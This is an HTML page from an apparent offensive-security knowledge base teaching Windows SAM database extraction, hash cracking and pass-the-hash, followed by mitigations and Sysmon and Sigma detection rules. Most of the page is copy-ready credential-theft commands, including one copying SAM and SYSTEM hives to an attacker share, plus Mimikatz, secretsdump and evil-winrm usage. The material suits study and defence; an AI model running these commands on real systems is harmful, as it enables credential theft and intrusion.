@@ -1,0 +1,336 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SAM Extraction | Saikumar Infosec</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+  <link rel="stylesheet" href="../core/styles/core.css">
+  <style>
+    .page-header { padding: 4rem 0 2rem; }
+    .breadcrumb { margin-bottom: 1rem; color: var(--text-secondary); font-size: 0.85rem; display: flex; gap: 0.5rem; flex-wrap: wrap; }
+    .breadcrumb a { color: var(--primary); text-decoration: none; }
+    .severity-badge { display: inline-block; padding: 0.5rem 1rem; border-radius: 40px; font-size: 0.75rem; font-weight: 600; margin-bottom: 1rem; }
+    .severity-high { background: rgba(255,136,0,0.2); color: #ff8800; }
+    .meta-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 1rem; margin: 1.5rem 0; padding: 1rem; background: var(--bg-card); border: 1px solid var(--border); border-radius: 0.75rem; }
+    .meta-item { padding: 0.5rem; }
+    .meta-item strong { display: block; color: var(--primary); margin-bottom: 0.25rem; font-size: 0.7rem; text-transform: uppercase; }
+    .meta-item span { color: var(--text-secondary); font-size: 0.85rem; }
+    .content-section { margin: 2rem 0; }
+    .content-section h2 { font-size: 1.4rem; margin: 2rem 0 1rem; color: var(--primary); border-left: 3px solid var(--primary); padding-left: 1rem; font-weight: 600; }
+    .content-section p { margin: 0.75rem 0; color: var(--text-secondary); line-height: 1.7; }
+    .content-section ul, .content-section ol { margin: 1rem 0; padding-left: 1.5rem; color: var(--text-secondary); }
+    .content-section li { margin: 0.5rem 0; line-height: 1.6; }
+    .content-section code { background: var(--bg-elevated); padding: 2px 6px; border-radius: 4px; color: var(--primary); font-family: 'Courier New', monospace; font-size: 0.9em; }
+    .code-block { background: var(--bg-card); border: 1px solid var(--border); border-radius: 0.75rem; padding: 1.2rem; margin: 1.5rem 0; overflow-x: auto; font-family: 'Courier New', monospace; font-size: 0.8rem; color: var(--primary); position: relative; }
+    .code-block pre { margin: 0; white-space: pre-wrap; word-wrap: break-word; }
+    .copy-btn { position: absolute; top: 0.5rem; right: 0.5rem; background: var(--bg-elevated); border: 1px solid var(--border); padding: 0.4rem 0.8rem; border-radius: 4px; cursor: pointer; color: var(--text-secondary); font-size: 0.75rem; transition: var(--transition); }
+    .copy-btn:hover { color: var(--primary); background: var(--bg-card); }
+    .back-link { display: inline-flex; align-items: center; gap: 0.5rem; margin-top: 2rem; color: var(--primary); text-decoration: none; }
+    .back-link:hover { text-decoration: underline; }
+    .vulnerability-box { background: rgba(255,68,68,0.1); border-left: 4px solid #ff4444; padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .vulnerability-box strong { color: #ff4444; }
+    .mitigation-box { background: rgba(0,245,160,0.1); border-left: 4px solid var(--primary); padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .mitigation-box strong { color: var(--primary); }
+    .info-box { background: rgba(79,140,255,0.1); border-left: 4px solid #4f8cff; padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .info-box strong { color: #4f8cff; }
+    @media (max-width: 768px) { .meta-grid { grid-template-columns: 1fr; } }
+  </style>
+</head>
+<body>
+<nav class="navbar">
+  <div class="container nav-flex">
+    <a href="../index.html" class="logo">Saikumar<span>.Infosec</span></a>
+    <button class="mobile-menu" id="mobileMenuBtn"><i class="fas fa-bars"></i></button>
+    <ul class="nav-links" id="navLinks">
+      <li><a href="../index.html">Home</a></li>
+      <li><a href="index.html">Windows Security</a></li>
+      <li><a href="../index.html#contact">Contact</a></li>
+      <li><button class="theme-toggle" id="themeToggle"><i class="fas fa-moon"></i> <span>Dark</span></button></li>
+    </ul>
+  </div>
+</nav>
+<main>
+  <div class="container">
+    <div class="breadcrumb">
+      <a href="../index.html">Home</a> / <a href="index.html">Windows Security</a> / SAM Extraction
+    </div>
+    <div class="page-header">
+      <span class="severity-badge severity-high"><i class="fas fa-exclamation-triangle"></i> High Severity | T1003.002</span>
+      <h1>🗄️ SAM Database Extraction</h1>
+      <div class="meta-grid">
+        <div class="meta-item"><strong>MITRE</strong><span>T1003.002</span></div>
+        <div class="meta-item"><strong>Platform</strong><span>Windows</span></div>
+        <div class="meta-item"><strong>Phase</strong><span>Credential Access</span></div>
+        <div class="meta-item"><strong>Difficulty</strong><span>Easy-Medium</span></div>
+      </div>
+    </div>
+    <div class="content-section" id="description">
+      <h2>🧠 Description</h2>
+      <p>The Security Account Manager (SAM) database stores local user account hashes on Windows systems. Extracting the SAM database allows attackers to obtain NTLM password hashes for all local accounts, which can then be cracked or used for Pass-the-Hash attacks.</p>
+      <div class="vulnerability-box">
+        <strong>Why SAM Extraction Works:</strong>
+        <ul>
+          <li><strong>Local Storage:</strong> SAM file contains all local user hashes</li>
+          <li><strong>Registry Access:</strong> System and SAM hives are readable by Administrators</li>
+          <li><strong>Offline Parsing:</strong> Hives can be extracted and cracked offline</li>
+          <li><strong>LM Hashes:</strong> Often weak, easily cracked</li>
+        </ul>
+      </div>
+    </div>
+    <div class="content-section" id="extraction">
+      <h2>💣 Extraction Methods</h2>
+      <p><strong>1. Registry Save (Requires Admin):</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Save SAM and SYSTEM hives
+reg save HKLM\SAM sam.hive /y
+reg save HKLM\SYSTEM system.hive /y
+
+# Default location: %WINDIR%\System32\config\
+# Or saved to current directory
+
+# Alternative - copy files directly (locked but readable)
+copy C:\Windows\System32\config\SAM \\attacker\share\SAM
+copy C:\Windows\System32\config\SYSTEM \\attacker\share\SYSTEM</pre>
+      </div>
+      <p><strong>2. Volume Shadow Copy (Alternative Method):</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Create VSS snapshot
+vssadmin create shadow /for=C:
+
+# Copy SAM from shadow copy
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\temp\SAM
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\SYSTEM
+
+# Cleanup
+vssadmin delete shadows /shadow={shadow_id}</pre>
+      </div>
+      <p><strong>3. Mimikatz (Direct Extraction):</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Token elevation then extract
+mimikatz "privilege::debug" "token::elevate" "lsadump::sam" "exit"
+
+# From SAM file directly
+mimikatz "lsadump::sam /sam:sam.hive /system:system.hive" "exit"
+
+# With explicit file location
+lsadump::sam /sam:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM
+
+# Get cached domain credentials too
+lsadump::sam /sam:sam.hive /system:system.hive /bootkey</pre>
+      </div>
+      <p><strong>4. Impacket SecretsDump (Linux):</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Parse saved hives
+python3 secretsdump.py -sam sam.hive -system system.hive LOCAL
+
+# Extract with just SYSTEM hive (bootkey)
+python3 secretsdump.py -system system.hive LOCAL
+
+# From remote host with credentials
+python3 secretsdump.py user:password@target.corp.com
+
+# Using pass-the-hash
+python3 secretsdump.py -hashes :ntlmhash domain/user@target.corp.com</pre>
+      </div>
+    </div>
+    <div class="content-section" id="cracking">
+      <h2>🔓 Hash Cracking</h2>
+      <p><strong>Hashcat:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># NTLM hash cracking (mode 1000)
+hashcat -m 1000 -a 0 hashes.txt wordlist.txt
+
+# LM hash cracking (mode 3000)
+hashcat -m 3000 -a 0 hashes.txt wordlist.txt
+
+# Combined wordlist + rules
+hashcat -m 1000 -a 0 hashes.txt wordlist.txt -r rules/best64.rule
+
+# Show status
+hashcat -m 1000 -a 0 hashes.txt wordlist.txt --show</pre>
+      </div>
+      <p><strong>John the Ripper:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># NTLM format
+john --format=nt2 --wordlist=wordlist.txt hashes.txt
+
+# Raw NTLM (no user:RID:hash format)
+john --format=NT --wordlist=wordlist.txt hashes.txt
+
+# Auto-detect format
+john hashes.txt --wordlist=wordlist.txt
+
+# Show cracked passwords
+john --show hashes.txt</pre>
+      </div>
+      <p><strong>Format for Cracking:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># From Mimikatz output - format is:
+# username:RID:lmhash:nthash:::
+
+# Example:
+# administrator:500:aad3b435b51404eeaad3b435b51404ee:hash1234567890:::
+
+# Remove lm hash if not needed
+# Just nthash needed: hash1234567890:::</pre>
+      </div>
+    </div>
+    <div class="content-section" id="pth">
+      <h2>🎯 Pass-the-Hash with SAM Hashes</h2>
+      <p><strong>Use Cracked Hashes:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Mimikatz PtH
+mimikatz "privilege::debug" "sekurlsa::pth /user:administrator /domain:target /ntlm:hash" "exit"
+
+# CrackMapExec
+crackmapexec smb target.corp.com -u administrator -H nthash -x "whoami"
+
+# Pass the hash with PassTheHash tool
+python3 wmiexec.py -hashes :nthash domain/user@target.corp.com
+
+# Using evil-winrm
+evil-winrm -i target.corp.com -u administrator -H nthash</pre>
+      </div>
+      <p><strong>Use LM Hash if NTLM Weak:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># If LM hash present, might be crackable
+# Some systems still store LM for compatibility
+
+# Crack LM with hashcat (mode 3000)
+hashcat -m 3000 lm_hashes.txt wordlist.txt</pre>
+      </div>
+    </div>
+    <div class="content-section" id="mitigation">
+      <h2>🛡️ Mitigation</h2>
+      <div class="mitigation-box">
+        <strong>✅ Primary Controls:</strong>
+        <ul>
+          <li><strong>Disable LM Hashes:</strong> No LM storage in SAM</li>
+          <li><strong>Strong Passwords:</strong> 14+ characters, complex, unique</li>
+          <li><strong>Local Admin Protection:</strong> Microsoft LAPS or similar</li>
+          <li><strong>Restrict Registry:</strong> Limit who can save hives</li>
+          <li><strong>BitLocker:</strong> Encrypt system drive</li>
+          <li><strong>Audit Local Accounts:</strong> Monitor for suspicious admin accounts</li>
+        </ul>
+      </div>
+      <p><strong>Disable LM Hash Storage:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Via Security Policy
+# Computer Configuration > Policies > Security Options >
+# Network security: Do not store LAN Manager hash value on next password change
+
+# Enable via registry
+REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v NoLMHash /t REG_DWORD /d 1 /f
+
+# Requires password change to take effect</pre>
+      </div>
+    </div>
+    <div class="content-section" id="detection">
+      <h2>🔍 Detection</h2>
+      <p><strong>Event Log Monitoring:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Event ID 4657 - Audit registry value creation (SAM access)
+# Event ID 4660 - Audit object deletion
+# Event ID 4673 - Sensitive privilege use
+
+# Monitor for:
+# - reg.exe saving SAM/SYSTEM hives
+# - Process accessing HKLM\SAM
+# - Command: reg save HKLM\SAM
+
+# Use Sysmon
+# Track registry operations on SAM key</pre>
+      </div>
+      <p><strong>Sysmon Configuration:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Monitor SAM registry access
+<RegistryEvent onmatch="include">
+  <TargetObject condition="contains">HKLM\System\CurrentControlSet\Control\Lsa</TargetObject>
+  <TargetObject condition="contains">HKLM\SAM</TargetObject>
+</RegistryEvent>
+
+# Alert on SAM backup operations
+<ProcessCreate>
+  <CommandLine condition="contains">reg save HKLM\SAM</CommandLine>
+</ProcessCreate></pre>
+      </div>
+      <p><strong>Sigma Rules:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre>title: SAM Registry Backup
+id: sam-registry-save
+detection:
+  selection:
+    EventID: 1
+    CommandLine|contains:
+      - 'reg save HKLM\SAM'
+      - 'reg save HKLM\SYSTEM'
+      - '\config\SAM'
+      - '\config\SYSTEM'
+  condition: selection
+level: high</pre>
+      </div>
+    </div>
+    <div class="content-section" id="tools">
+      <h2>🛠️ Tools</h2>
+      <ul>
+        <li><strong>Mimikatz:</strong> Direct SAM extraction and parsing</li>
+        <li><strong>Impacket (secretsdump):</strong> Offline SAM parsing from hives</li>
+        <li><strong>hashcat:</strong> GPU-accelerated hash cracking</li>
+        <li><strong>John the Ripper:</strong> Open-source hash cracking</li>
+        <li><strong>Creddump7:</strong> Python-based SAM extraction</li>
+      </ul>
+    </div>
+    <div class="content-section" id="references">
+      <h2>📚 References</h2>
+      <ul>
+        <li><a href="https://github.com/gentilkiwi/mimikatz/wiki" target="_blank">Mimikatz Wiki</a></li>
+        <li><a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-do-not-store-lan-manager-hash-value-on-next-password-change" target="_blank">LM Hash Mitigation</a></li>
+        <li><a href="https://github.com/SecureAuthCorp/impacket" target="_blank">Impacket</a></li>
+      </ul>
+    </div>
+    <a href="index.html" class="back-link"><i class="fas fa-arrow-left"></i> Back to Windows Security</a>
+  </div>
+</main>
+<footer class="footer">
+  <div class="container">
+    <p>Saikumar Raju | Offensive Security Knowledge Base</p>
+    <p>Always test in authorized environments only.</p>
+  </div>
+</footer>
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+  const mobileBtn = document.getElementById('mobileMenuBtn');
+  const navLinks = document.getElementById('navLinks');
+  if (mobileBtn) { mobileBtn.addEventListener('click', () => navLinks.classList.toggle('show')); }
+  const themeToggle = document.getElementById('themeToggle');
+  if (themeToggle) {
+    themeToggle.addEventListener('click', () => {
+      document.body.classList.toggle('light');
+      const icon = themeToggle.querySelector('i');
+      const text = themeToggle.querySelector('span');
+      if (document.body.classList.contains('light')) { icon.classList.remove('fa-moon'); icon.classList.add('fa-sun'); text.textContent = 'Light'; }
+      else { icon.classList.remove('fa-sun'); icon.classList.add('fa-moon'); text.textContent = 'Dark'; }
+      localStorage.setItem('theme-preference', document.body.classList.contains('light') ? 'light' : 'dark');
+    });
+  }
+  if (localStorage.getItem('theme-preference') === 'light') document.body.classList.add('light');
+});
+function copyCode(btn) { const code = btn.parentElement.querySelector('pre').innerText; navigator.clipboard.writeText(code); btn.textContent = 'Copied!'; setTimeout(() => { btn.textContent = 'Copy'; }, 2000); }
+</script>
+</body>
+</html>
